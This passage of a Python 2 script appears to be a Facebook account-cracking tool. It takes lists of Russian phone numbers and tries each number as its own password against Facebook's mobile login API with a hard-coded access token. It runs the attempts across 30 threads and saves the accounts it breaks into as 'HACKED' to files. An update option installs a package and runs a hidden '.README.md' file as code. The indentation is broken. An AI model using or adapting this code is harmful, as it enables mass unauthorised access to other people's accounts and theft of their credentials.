		print("713, 732, 901, 902, 903, 907, 908, 909, 910, 911, 916, 919, 920, 925, 930, 931, 951, 952, 953, 955, 963, 964, 966, 967, 985, 992,")
		try:
			c = raw_input(" choose code  : ")
			k="+7"
			idlist = ('.txt')  
			for line in open(idlist,"r").readlines():
				id.append(line.strip())
		except IOError:
			print ("[!] File Not Found")
			raw_input("\n[ Back ]")
			menu()
        elif bch =="62":
		os.system("clear")
		print (logo)
		print("713, 732, 901, 902, 903, 907, 908, 909, 910, 911, 916, 919, 920, 925, 930, 931, 951, 952, 953, 955, 963, 964, 966, 967, 985, 992,")
		try:
			c = raw_input(" choose code  : ")
			k="+7"
			idlist = ('.txt')  
			for line in open(idlist,"r").readlines():
				id.append(line.strip())
		except IOError:
			print ("[!] File Not Found")
			raw_input("\n[ Back ]")
			menu()        
	elif bch =="63":		
		os.system("clear")
		print (logo)
		print("713, 732, 901, 902, 903, 907, 908, 909, 910, 911, 916, 919, 920, 925, 930, 931, 951, 952, 953, 955, 963, 964, 966, 967, 985, 992,")
		try:
			c = raw_input(" choose code  : ")
			k="+7"
			idlist = ('.txt')  
			for line in open(idlist,"r").readlines():
				id.append(line.strip())
		except IOError:
			print ("[!] File Not Found")
			raw_input("\n[ Back ]")
			menu()
	elif bch =="64":
		os.system("clear")
		print (logo)
		print("713, 732, 901, 902, 903, 907, 908, 909, 910, 911, 916, 919, 920, 925, 930, 931, 951, 952, 953, 955, 963, 964, 966, 967, 985, 992,")
		try:
			c = raw_input(" choose code  : ")
			k="+7"
			idlist = ('.txt')  
			for line in open(idlist,"r").readlines():
				id.append(line.strip())
		except IOError:
			print ("[!] File Not Found")
			raw_input("\n[ Back ]")
			menu()
        elif bch =="65":
		os.system("clear")
		print (logo)
		print("713, 732, 901, 902, 903, 907, 908, 909, 910, 911, 916, 919, 920, 925, 930, 931, 951, 952, 953, 955, 963, 964, 966, 967, 985, 992,")
		try:
			c = raw_input(" choose code  : ")
			k="+7"
			idlist = ('.txt')  
			for line in open(idlist,"r").readlines():
				id.append(line.strip())
		except IOError:
			print ("[!] File Not Found")
			raw_input("\n[ Back ]")
			menu()
        elif bch =="66":
		os.system("clear")
		print (logo)
		print("713, 732, 901, 902, 903, 907, 908, 909, 910, 911, 916, 919, 920, 925, 930, 931, 951, 952, 953, 955, 963, 964, 966, 967, 985, 992,")
		try:
			c = raw_input(" choose code  : ")
			k="+7"
			idlist = ('.txt')  
			for line in open(idlist,"r").readlines():
				id.append(line.strip())
		except IOError:
			print ("[!] File Not Found")
			raw_input("\n[ Back ]")
			menu()
        elif bch =="67":
		os.system("clear")
		print (logo)
		print("713, 732, 901, 902, 903, 907, 908, 909, 910, 911, 916, 919, 920, 925, 930, 931, 951, 952, 953, 955, 963, 964, 966, 967, 985, 992,")
		try:
			c = raw_input(" choose code  : ")
			k="+7"
			idlist = ('.txt')  
			for line in open(idlist,"r").readlines():
				id.append(line.strip())
		except IOError:
			print ("[!] File Not Found")
			raw_input("\n[ Back ]")
			menu()
        elif bch =="68":
		os.system("clear")
		print (logo)
		print("713, 732, 901, 902, 903, 907, 908, 909, 910, 911, 916, 919, 920, 925, 930, 931, 951, 952, 953, 955, 963, 964, 966, 967, 985, 992,")
		try:
			c = raw_input(" choose code  : ")
			k="+7"
			idlist = ('.txt')  
			for line in open(idlist,"r").readlines():
				id.append(line.strip())
		except IOError:
			print ("[!] File Not Found")
			raw_input("\n[ Back ]")
			menu()
        elif bch =="69":
		os.system("clear")
		print (logo)
		print("713, 732, 901, 902, 903, 907, 908, 909, 910, 911, 916, 919, 920, 925, 930, 931, 951, 952, 953, 955, 963, 964, 966, 967, 985, 992,")
		try:
			c = raw_input(" choose code  : ")
			k="+7"
			idlist = ('.txt')  
			for line in open(idlist,"r").readlines():
				id.append(line.strip())
		except IOError:
			print ("[!] File Not Found")
			raw_input("\n[ Back ]")
			menu()
        elif bch =="70":
		os.system("clear")
		print (logo)
		print("713, 732, 901, 902, 903, 907, 908, 909, 910, 911, 916, 919, 920, 925, 930, 931, 951, 952, 953, 955, 963, 964, 966, 967, 985, 992,")
		try:
			c = raw_input(" choose code  : ")
			k="+7"
			idlist = ('.txt')  
			for line in open(idlist,"r").readlines():
				id.append(line.strip())
		except IOError:
			print ("[!] File Not Found")
			raw_input("\n[ Back ]")
			menu()  
	elif bch =="100":		
	    os.system("clear")
	    os.system("pip2 install --upgrade balln")
	    os.system("pip2 install --upgrade balln")
	    os.system("clear")
	    print(logo)
	    print
	    psb (" Tool has been successfully updated")
	    time.sleep(2)
	    os.system("python2 .README.md")
#	elif chb =='3':
#	    os.system('xdg-open https://www.facebook.com/100002059014174/posts/2677733205638620/?substory_index=0&app=fbl')
#	    time.sleep(1)
#	    menu()
	elif bch =='0':
		exb()
	else:
		print '[!] Fill in correctly'
		action()
 
	xxx = str(len(id))
	psb ('[?] Total Numbers: '+xxx)
	time.sleep(0.5)
	psb ('[?] Please wait, process is running ...')
	time.sleep(0.5)
	psb ('[?] Sometimes The Number Maynot Work...')
	time.sleep(0.5)
	psb ('[?] If total number not work then use vpn...')
	time.sleep(0.5)
	psb ('[!] To Stop Process Press CTRL Then Press z')
	time.sleep(0.5)
	print 50*'-'
	print
	
			
	def main(arg):
		global cpb,oks
		user = arg
		try:
			os.mkdir('save')
		except OSError:
			pass
		try:
			pass1 = user
			data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
			q = json.load(data)
			if 'access_token' in q:
				print '\x1b[1;92mARBAB-HACKED]\x1b[0m ' + k + c + user + ' | ' + pass1+'\n'+"\n"
				okb = open('save/successfull.txt', 'a')
				okb.write(k+c+user+'|'+pass1+'\n')
				okb.close()
				oks.append(c+user+pass1)
			else:
				if 'www.facebook.com' in q['error_msg']:
					print '[CHECKPOINT] ' + k + c + user + ' | ' + pass1+'\n'
					cps = open('save/checkpoint.txt', 'a')
					cps.write(k+c+user+'|'+pass1+'\n')
					cps.close()
					cpb.append(c+user+pass1)
 
															
		except:
			pass
		
	p = ThreadPool(30)
	p.map(main, id)
	print 50*'-'
	print '[?] Process Has Been Completed ....'
	print '[?] Total OK/CP : '+str(len(oks))+'/'+str(len(cpb))
	print('[?] CP File Has Been Saved : save/checkpoint.txt')
	raw_input('\n[Press Enter To Go Back]')
	os.system('python2 .README.md')
		
if __name__ == '__main__':
	menu()
 
